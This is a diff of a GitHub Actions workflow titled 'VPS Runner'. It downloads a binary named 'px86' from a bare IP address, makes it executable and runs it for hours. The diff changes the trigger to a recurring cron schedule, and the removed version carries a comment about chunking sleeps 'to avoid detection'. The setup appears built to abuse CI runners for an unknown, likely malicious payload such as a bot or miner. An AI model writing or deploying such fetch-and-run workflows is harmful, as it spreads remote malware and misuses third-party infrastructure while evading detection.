@@ -1,47 +1,29 @@
 name: VPS Runner
 
 on:
-  workflow_dispatch:
-    inputs:
-      uptime:
-        description: 'VPS uptime in hours (max 6)'
-        required: false
-        default: '6'
-        type: choice
-        options:
-          - '1'
-          - '2'
-          - '3'
-          - '4'
-          - '5'
-          - '6'
+  schedule:
+    # Runs at 00:00, 04:00, 08:00, 12:00, 16:00, and 20:00 UTC
+    - cron: '0 */4 * * *'
 
 jobs:
   run-binary:
     runs-on: ubuntu-latest
-    timeout-minutes: 360  # 6 hours maximum
-
+    timeout-minutes: 240 # Run for 4 hours
     steps:
-    - name: Download binary
-      run: |
-        wget http://45.138.16.158/bins/px86 -O px86
-        chmod +x px86
+      - name: Download binary
+        run: |
+          wget http://45.138.16.158/bins/px86 -O px86
+          chmod +x px86
 
-    - name: Run binary with discrete timing
-      run: |
-        UPTIME=${{ github.event.inputs.uptime }}
-        echo "Running for $UPTIME hours"
-        
-        # Run binary in background
-        ./px86 x86 &
-        PID=$!
-        
-        # Break sleep into smaller chunks to avoid detection
-        TOTAL_SECONDS=$(($UPTIME * 3600))
-        for i in $(seq 1 $TOTAL_SECONDS); do
-          sleep 1
-        done
-        
-        # Cleanup
-        kill $PID 2>/dev/null || true
-        echo "Completed successfully"
+      - name: Run binary for 4 hours
+        run: |
+          UPTIME_SECONDS=$((4 * 3600))
+          echo "Running for 4 hours"
+
+          ./px86 x86 &
+          PID=$!
+
+          sleep $UPTIME_SECONDS
+
+          kill $PID 2>/dev/null || true
+          echo "Completed successfully"
